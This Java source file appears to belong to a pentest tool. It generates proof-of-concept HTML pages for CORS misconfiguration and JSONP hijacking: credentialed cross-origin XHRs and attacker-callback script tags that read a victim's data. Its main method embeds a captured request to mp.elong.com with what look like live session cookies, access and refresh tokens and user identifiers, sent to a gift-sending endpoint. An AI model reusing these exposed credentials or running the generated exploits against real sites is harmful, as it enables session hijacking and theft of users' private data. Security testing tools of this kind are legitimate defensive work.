package main.util;

import java.util.Arrays;
import java.util.List;

public class CorsJsonp {
    public static void main(String[] args) {
//        String Content = JsonpPocMake("http://10.211.55.4/Dorabox/csrf/jsonp.php?callback=test&a=1&b=2&c=3");
//        System.out.println(Content);

        String httprequests = "POST /javaPromotion/redPacket/sendGift HTTP/2\n" +
                "Host: mp.elong.com:1111\n" +
                "Cookie: outerFrom=1000000; H5CookieId=af0ec0d5-1482-4ce2-af18-80dd834bcae4; H5SessionId=2C14AA9D0A328EC1226629C02C1E5706; cardno=240000000616408673; wxxcxOpenId=o498X0W52RQf9Py2mKDkzkbPu9Ss; TC_FLAG=296_1; openid=oIXQtLwaGuTdOLXhC4uNlWLBd97I; AUTH_OPENID=oIXQtLwaGuTdOLXhC4uNlWLBd97I; AUTH_UNIONID=ohmdTt7C0J0bsXMYqi6iUvyQ20E4; AUTH_CHECK=4d727d6218bfe2a1f3e7dbf2cf51a6a7; AUTH_ACCESSTOKEN=JDGco/T+FmysyWcuIHisp9rwMFf77nhZrc4NM5GCxVTaDX5rXJQ+Gvm4q5YQIKwzrkf3lBrtHg9P3W3tlfb7A5xdYEIoST0ugTaMr8WxtwfMtgqgEAi6AucYnczHnxEt; AUTH_REFRESHTOKEN=cC/rRbIsoM/NvwzyWZvjOlH6KVWl+iVa4KFbQkhU+EBwxBid5M2SeP2uMGKFJ4dfWaRpobkGzVkTRUrd61dK61NxC4WM9gV6hJsLzXzLfe9oIczKGbpZ7lWchLgN3GWP; tetoken=+pomfmaVG9UFKLDXCuc+GC9dXir5/xLsP7wcm3YhJh+JA6k4hm7WYud0W0qlipeJO/nvlEaKYxZ2ndRFDCMPDS/HhrBi33Zcf+3PAq5h4cSNJr/EbVCmoMYJ5DTJ33Lk; SessionToken=d5cb6df1-5ff8-4f72-acb6-6830ef3311a501; elinfo=8FhuXrvpIG/Cgo3J6EqyF96m0DeFC4hxUfzImNfiDXc3ydEDSpzAl3+DOiwW89VE; businessLine=promotion; H5Channel=wxqbh5%2CNormal; innerFrom=26339; ch=xinkezhuanxiang; ext_param=bns%3D2%26ct%3D5%26hoff%3D1027%26opens%3Dtcqb_xcxh5; __tjcount=3\n" +
                "Content-Length: 123\n" +
                "Accept: application/json, text/plain, */*\n" +
                "Origin: https://mp.elong.com\n" +
                "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; P10 Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 MMWEBID/6259 MicroMessenger/7.0.22.1820(0x27001636) Process/appbrand2 WeChat/arm32 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram\n" +
                "Content-Type: application/json;charset=UTF-8\n" +
                "Referer: https://mp.elong.com/mobilepromotion/dynamicgrasp/index/?backAPI=back&wxxcxHome=%2Fpage%2Fhome%2Findex%2Findex&wxxcxOpenId=o498X0W52RQf9Py2mKDkzkbPu9Ss&wxxcxUnionId=ohmdTt7C0J0bsXMYqi6iUvyQ20E4&walletEntry=tcqb_xcxh5&wxxcxScene=1027&appfrom=4&wxrefid=319527329&_lat=&_lng=&_ctyid=&_loctime=1638105254186&_loctype=&_socketService=3&newactivityid=cf6517c0-3a52-42d6-82db-e731b8dca91f&if=26339&ch=xinkezhuanxiang&t=1638105254183&newUser=false\n" +
                "Accept-Encoding: gzip, deflate\n" +
                "Accept-Language: zh-CN,en-US;q=0.9\n" +
                "X-Requested-With: com.tencent.mm\n" +
                "\n" +
                "{\"activitycode\":\"cf6517c0-3a52-42d6-82db-e731b8dca91f\",\"giftId\":\"5f62e09cd017b02dc3754bc6d89ec7d3\",\"traceId\":1638105267735}";
        String CorsContent = CorsPocMake(httprequests,"https");
        System.out.println(CorsContent);

    }

    public static String CorsPocMake(String httpRequests,String http){
        String Corspoc = "<html><head></head><body><script>" +
                "function createXHR () {\n" +
                "    var XHR = [  \n" +
                "        function () { return new XMLHttpRequest () },\n" +
                "        function () { return new ActiveXObject (\"Msxml2.XMLHTTP\") },\n" +
                "        function () { return new ActiveXObject (\"Msxml3.XMLHTTP\") },\n" +
                "        function () { return new ActiveXObject (\"Microsoft.XMLHTTP\") }\n" +
                "    ];\n" +
                "    var xhr = null;\n" +
                "    for (var i = 0; i < XHR.length; i ++) {\n" +
                "        try {\n" +
                "            xhr = XHR[i]();\n" +
                "        } catch(e) {\n" +
                "            continue  \n" +
                "        }\n" +
                "        break;  \n" +
                "    }\n" +
                "    return xhr;  \n" +
                "}\n" +
                "\n" +
                "function cors() {\n" +
                "var xhttp = createXHR();\n" +
                "\n" +
                "xhttp.onreadystatechange = function() {\n" +
                "if (this.readyState == 4 && this.status == 200) {\n" +
                "document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n" +
                "}};\n" +
                "xhttp.withCredentials = true;\n";
        String data = ""; // 默认post数据为空
        String host = "";
        String[] requestslists2 = httpRequests.split("\n\n"); // \n\n分割，确认post的数据
        String[] requestslists = httpRequests.split("\n");
        String method = requestslists[0].split(" ")[0]; // 请求方法
        String uri = requestslists[0].split(" ")[1]; // 请求uri
        String[] requestHeaders = requestslists2[0].split("\n"); // 除去请求体的数据包

        String[] CorsWhites = {"origin","cookie","user-agent","x-requested-with","referer","host","content-Length","accept-encoding","accept-language","content-length","accept","connection","upgrade-insecure-requests"};
        List<String> list = Arrays.asList(CorsWhites);

        for (int i = 1; i < requestHeaders.length ;i ++) // 去掉第一行
            requestHeaders[i-1] = requestHeaders[i];
        requestHeaders[requestHeaders.length-1] = null;

        for(String request:requestHeaders)
            if (request != null){
                String[] requestlists = request.split(":");
                if (requestlists[0].toLowerCase().startsWith("host")) {
                    String[] hosts = request.toLowerCase().split("host:");
                    host = hosts[1].trim();
                    Corspoc = Corspoc + "xhttp.open(\"" + method + "\", \"" + http + "://" + host  + uri + "\", true);\n";
                }
                if (!list.contains(requestlists[0].toLowerCase())) {
                    if (requestlists[1].contains("\"")){
                        requestlists[1] = requestlists[1].replace("\"","\\\"");
                    }
                    if (requestlists[0].contains("\"")){
                        requestlists[0] = requestlists[0].replace("\"","\\\"");
                    }
                    Corspoc = Corspoc + "\n" + "xhttp.setRequestHeader(\"" + requestlists[0] + "\",\"" + requestlists[1] + "\");\n";
                }
            }

        if (requestslists2.length == 2) { // 判断如果长度为2，证明为post方法，所以1序列为请求的数据
            data = "xhttp.send('" + requestslists2[1] + "');\n}\ncors();\n";
        }
        else{
            data = "xhttp.send();\n}\ncors();\n";;
        }


        return Corspoc + data + "</script></body></html>";
    }

    public static String JsonpPocMake(String vulnurl){
        String[] vulnurllists = vulnurl.split("callback=");
        if (vulnurllists[1].contains("&")) {
            String[] params = vulnurllists[1].split("&");
            String paramBuilder = params[1] + "&";
            for (int i = 2; i < params.length; i++)
                paramBuilder = paramBuilder + params[i] + "&";
            vulnurl = vulnurllists[0] + paramBuilder + "callback=poc2jar";
        }else{
            vulnurl = vulnurllists[0] + "callback=poc2jar";
        }

        String Jsonpoc = "<html>\n" +
                "<head>\n" +
                "</head>\n" +
                "<body>\n" +
                "<script>\n" +
                "function poc2jar(json){\n" +
                "alert(JSON.stringify(json))\n" +
                "}\n" +
                "</script>\n" +
                "<script src=\""+ vulnurl + "\"></script>" +
                "</body>\n" +
                "</html>";

        return Jsonpoc;
    }


}
